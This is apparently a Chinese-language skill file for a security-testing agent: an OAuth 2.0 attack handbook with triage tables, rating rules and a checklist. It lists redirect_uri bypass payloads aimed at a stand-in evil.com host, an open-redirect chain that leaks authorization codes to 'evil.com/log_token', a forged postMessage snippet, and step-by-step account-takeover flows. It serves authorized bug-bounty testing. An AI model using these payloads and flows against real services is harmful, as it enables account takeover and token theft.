---
name: oauth-advanced
description: CWE: CWE-352 / CWE-601 / CWE-294 | OWASP: WSTG-ATHN-09 / A07:2021 核心: OAuth 流程多个点都易出错: redirecturi 校验差异 / state 缺失重放 / PKCE 未启用 / code 拦截重放…
category: vuln
tags: [auth]
---

# OAuth 2.0 高级攻击深度手册 (PKCE / state / redirect_uri / code 重放)

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-352 / CWE-601 / CWE-294 | **OWASP**: WSTG-ATHN-09 / A07:2021
> **核心**: OAuth 流程多个点都易出错: redirect_uri 校验差异 / state 缺失重放 / PKCE 未启用 / code 拦截重放 / 隐式流 token 泄露 → **账号接管**
> **赏金**: 严重 $3000-$25000 (任何用 "Sign in with Google/Facebook/GitHub/微信/QQ" 的应用都是候选)

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| `/authorize` 含 `client_id` + `redirect_uri` | OAuth Authorization 入口 | §1 redirect_uri 攻击 |
| 响应 URL Fragment 含 `#access_token=` | Implicit Flow (危险) | §0.2 + §4 token 泄露 |
| `/authorize` 缺 `state` | CSRF 可能 | §2 state 缺失 |
| `/authorize` 缺 `code_challenge` | 无 PKCE,公开 client 易被攻击 | §3 PKCE 缺失 |
| redirect_uri 接受任意子域 / 通配 | redirect_uri 校验弱 | §1 |
| OIDC 场景 (响应含 `id_token`) | OIDC 攻击 | → [oidc-attacks.md](oidc-attacks.md) |
| SAML 场景 | SAML 攻击 | → [saml-attacks.md](saml-attacks.md) |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 0.1 Triage 速查

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| redirect_uri 改 evil.com 被拒 | 严格白名单 | 试子域 / 路径附加 / Open Redirect 跳板 |
| state 缺失但 cookie 有 anti-CSRF | 备用防护 | 仍可能 OAuth Flow 内 CSRF |
| code 重放成功 | 严重: 一次性失效失败 | 立即记录,扩大测试 |
| Implicit Flow + Referer 泄露 | token 已泄露 | 检查日志/Referer 链 |

### Attack Surface

- `/authorize`、`redirect_uri`、`state`、`code`、`PKCE`、`/token`、refresh token、scope。
- 第三方登录、账号绑定、移动端 OAuth 回调、深链和中间跳转页。
- Open Redirect、弱域名匹配、跨 client code/token 使用和 token audience 缺失。

### Pro Tips

- 保存完整 redirect 链、参数变化、Set-Cookie 和最终账号状态。
- 使用两账号对照验证账号绑定劫持、code replay 和 token substitution。
- 外部回调域、邮箱/手机号、真实 IdP 授权都走 HITL 最小化验证。

### Evidence / Rating Boundary

- 仅 redirect_uri 可变但拿不到 code/token 通常是低危线索。
- state 缺失需证明账号绑定、登录 CSRF 或授权结果可被攻击者控制。
- code/token 泄露、重放、跨 client 混用或账号接管可进入 High/Critical。

### False Positive Gate

- 严格白名单拒绝、state 绑定 session、code 单次使用都可能阻断利用。
- 只看到第三方登录按钮或公开 OAuth metadata 不是漏洞。
- 报告必须说明受影响 client、回调链、账号边界和最终身份变化。

---

## 0.2 OAuth 流程速记

### 0.1 Authorization Code Flow (推荐)

```
1. RP → AS: GET /authorize?client_id=X&redirect_uri=Y&response_type=code&state=Z
2. AS → User: 登录 + 同意页
3. User → AS: 同意
4. AS → RP (via 浏览器 302): redirect_uri?code=XXX&state=Z
5. RP → AS: POST /token (client_id + client_secret + code + redirect_uri)
6. AS → RP: access_token + refresh_token
```

**攻击面**: 步 1 的 `redirect_uri`, 步 4 的浏览器跳转 (含 code), 步 5 的 token 兑换。

### 0.2 Implicit Flow (废弃, 但仍多见)

```
GET /authorize?response_type=token&...
→ 直接在 URL fragment 返回 access_token: ...#access_token=...
```

token 在浏览器 URL 中, 极易泄露 (Referrer / 浏览器历史 / 日志).

### 0.3 PKCE (RFC 7636) — 防 code 拦截

```
client 生成 code_verifier (随机), code_challenge = SHA256(verifier)
1. /authorize?code_challenge=XXX&code_challenge_method=S256
2. /token 兑换时带 code_verifier
3. AS 校验 SHA256(verifier) == challenge
```

---

## 1. redirect_uri 攻击 (最常见)

### 1.1 通配符配置 / 弱校验

| 配置 | 攻击 |
|------|------|
| `redirect_uri=https://*.target.com` | 子域接管后任意子域 |
| `startsWith("https://target.com")` | `https://target.com.evil.com` |
| `endsWith("target.com")` | `https://eviltarget.com` |
| `contains("target.com")` | `https://evil.com?target.com` |
| 路径不严 | `https://target.com/redirect` 若有 open redirect |
| 端口不校验 | `https://target.com:1234` (子域接管 + 自启动服务) |
| 协议不校验 | `redirect_uri=javascript:alert(document.domain)` (旧浏览器) |
| query / fragment 不校验 | `https://target.com#@evil.com/` |

### 1.2 URL Parser Differential

不同语言 / 库对 URL 解析不同:

```
https://target.com.evil.com                # 后端 endsWith 校验, evil 域
https://target.com@evil.com                 # 后端 startsWith, 实际访问 evil
https://target.com#@evil.com                # fragment 内嵌
https://target.com?@evil.com                # query 内嵌
https://evil.com\@target.com                # 反斜杠 (浏览器与 server 解析不同)
https://target.com\evil.com                 # 同上
https://target.com%2eevil.com               # URL 编码点
https://target.com%23.evil.com              # %23 = #
https://target.com%5c.evil.com              # %5c = \
https:/target.com (single /)                # 解析差异
//evil.com/x                                 # 协议相对
```

### 1.3 Open Redirect 链

若 target.com 本身有 open redirect:
```
redirect_uri=https://target.com/redirect?url=https://evil.com/log_token
```

OAuth 流跳到 target.com/redirect, 它再跳 evil.com — 浏览器把 code 通过 Referer 泄露给 evil.com.

### 1.4 利用流程

```
1. 攻击者构造恶意授权 URL:
   https://AS.com/authorize?client_id=...&redirect_uri=https://EVIL/cb&state=...

2. 诱受害者点击 (邮件/聊天)

3. 受害者已登录 AS, 自动同意 (或第一次需手动)

4. AS 跳到 https://EVIL/cb?code=XXX

5. 攻击者用 code 调 /token 兑换 token (若是公开 client) 或诱使 RP 调用 (若机密 client)

6. 拿到 victim access_token → API 接管
```

---

## 2. state 缺失 / 可预测 → CSRF (账号绑定劫持)

### 2.1 攻击场景

target.com 支持"绑定 GitHub 账号":

```
1. 攻击者发起 GitHub OAuth, 拿到 code (但不完成绑定)
   https://target.com/oauth/github/callback?code=ATTACKER_CODE

2. 诱受害者点击此 URL (state 缺失/可预测/未校验)

3. target.com 用 ATTACKER_CODE 完成绑定: victim 账号绑定了 attacker GitHub

4. 攻击者用自己 GitHub 登录 → 自动登入 victim 账号
```

### 2.2 修复绕过

- state 用 session ID → 攻击者自己的 session 也能验过 (state 必须绑定到登录会话)
- state 仅校验存在 / 长度, 不校验值 → 用任意值绕过

---

## 3. PKCE 缺失 / 弱 PKCE

### 3.1 PKCE 缺失场景

- Public client (SPA / mobile) 但未实施 PKCE
- code_challenge_method=plain 而非 S256

### 3.2 PKCE downgrade

```
请求: code_challenge=XXX&code_challenge_method=S256
攻击者中间人改成: code_challenge=YYY&code_challenge_method=plain
```

某些 AS 接受 downgrade 后, 攻击者可拦截 code 自己用任意 verifier 兑换.

### 3.3 PKCE in Implicit (无效)

Implicit flow 没有 code, PKCE 无意义但有些库错误开启 → 实际无防护.

---

## 4. Authorization Code 重放

### 4.1 单次性校验缺失

按 RFC, code 应**只能用一次**, 但部分 AS:
- 同 code 可多次兑换 token
- code 过期时间过长 (默认 10 分钟, 有的 1 小时)

### 4.2 Cross-Client Code 混用

不同 client_id 可互用 code (AS 校验不严):

```
1. Attacker client 拿到 code (诱受害者授权 attacker client)
2. 用 victim client_id + code 调 /token → 拿到 victim 视角 token
```

### 4.3 Public client 无 secret 兑换

Public client (mobile / SPA) 不提供 client_secret, 任何人拿 code 都可兑换.

---

## 5. Implicit Flow 特有漏洞

### 5.1 Token 泄露通道

- URL fragment → 浏览器 Referer (旧浏览器)
- Browser history
- Server access log
- Browser extension / DevTools

### 5.2 Postmessage 拦截

如果 RP 用 popup + `window.postMessage` 传 token:

```js
// 攻击者页面:
window.opener.postMessage({access_token: "ATTACKER_TOKEN"}, "*");
```

若 RP 未校验 message origin → 用攻击者的 token.

---

## 6. Token 滥用

### 6.1 Refresh Token 不轮换

- 一次 refresh_token 多次用, 应一次性
- 撤销后仍可用 (revocation 端点未实施)

### 6.2 Access Token Audience 缺失

- 给 RP1 的 token 可用于 RP2 (无 audience 检查)

### 6.3 Scope 越权

- AS 颁发的 token scope 包含 `admin`, RP 仅请求了 `read` → 看是否可用 admin scope

### 6.4 Token Substitution

```
# RP 校验 token 时, 仅看 user_id 不看 client_id
GET /api/profile (Authorization: Bearer <attacker_token>)
→ 返回 attacker 数据 (正常)

# 改 user_id 参数:
GET /api/profile?user_id=victim
→ 返回 victim 数据 (RP 用 token 内 user_id, 但被参数覆盖)
```

---

## 7. 第三方 OAuth 信任传递

### 7.1 Email-as-Identity 攻击

target.com 用 email 作为 user 唯一标识. 攻击者:

1. 注册 evil.com 域名
2. 在 evil.com 上配 GitHub OAuth, 验证 `victim@target.com` (GitHub 不强制 email 验证)
3. 用 GitHub 登录 target.com → target.com 看到 email 匹配 victim 账号 → 接管

防御: target.com 必须校验 email 是否 verified, 且 IdP 是否可信.

### 7.2 Pre-account-takeover

1. Victim 还没注册 target.com
2. Attacker 用 victim email 注册 target.com (本地账号, 未验证)
3. Attacker 用 OAuth (GitHub/Google) 同 email 登录 → 绑定 attacker GitHub 到 victim 账号
4. Victim 后来注册 / 登录, 实际进入 attacker GitHub 控制的账号

---

## 8. 工具

### 8.1 Burp Pro 自带

- Repeater 改 redirect_uri
- Logger++ 监控 OAuth 流程

### 8.2 EvilGinx2

中间人 OAuth phishing (合法演示, 不可滥用).

### 8.3 oauthor (CLI)

```bash
oauthor scan --target https://target.com/oauth/authorize
# 自动测 redirect_uri 50 种变体, state 校验, PKCE 状态
```

---

## 9. Testing Checklist

- [ ] 测 redirect_uri 50 种 URL parser 差异
- [ ] 拿合法 redirect_uri, 看是否子域接管
- [ ] state 删除 / 改值 → 看是否仍接受
- [ ] PKCE: 看 challenge_method 是否强制 S256
- [ ] code 重放: 同 code 二次兑换
- [ ] Cross-client code: 用 client A 的 code + client B 的 ID
- [ ] Implicit flow → token in URL → 检查 Referer / history
- [ ] postMessage origin 校验
- [ ] Refresh token 一次性
- [ ] Email-as-identity + 第三方 IdP 信任
- [ ] Pre-account-takeover 测试

---

## 10. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| redirect_uri 改了但 AS 401 | 校验严格, 非漏洞 |
| state 缺失但 AS 拒绝 | AS 强制要 state, 但 RP 校验缺失才是漏洞 |
| code 二次兑换 200 但 token 不同 | 可能是不同有效期 token, 仍是漏洞 (code 应单次) |
| PKCE downgrade 成功 | 看是否 RP 真的接受了非 S256 — 仅 AS 接受不一定漏洞 |
| Email 接管失败 | 多数大厂 (Google) 强制 email_verified, 第三方 IdP 才中招 |

---

## 11. 影响证明

- **低**: 流程信息泄露 (client_id / scope 列表)
- **中**: state CSRF 强制绑定 attacker 账号
- **高**: redirect_uri 漏洞 → code 拦截 → 完整账号接管
- **严重**: 批量受害者 (诱导 phishing 链接) / 拿 admin 账号 / 跨服务接管

---

## 12. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- SAML 攻击 → [saml-attacks.md](saml-attacks.md)
- OIDC 特有攻击 → [oidc-attacks.md](oidc-attacks.md)
- JWT 高级 → [jwt-advanced.md](jwt-advanced.md)
- 子域接管 (redirect_uri 子域接管) → [subdomain-takeover.md](subdomain-takeover.md)
- Open Redirect (redirect_uri 二次跳转) → [csrf-clickjacking.md](csrf-clickjacking.md)
- 认证逻辑 → [../auth-logic.md](../auth-logic.md)

---

**CWE**: CWE-352 / CWE-601 / CWE-294 | **WSTG**: ATHN-09 | **CVSS 典型**: 9.6 (redirect_uri 接管) / 8.1 (state CSRF) / 7.5 (PKCE 缺失需 MITM)
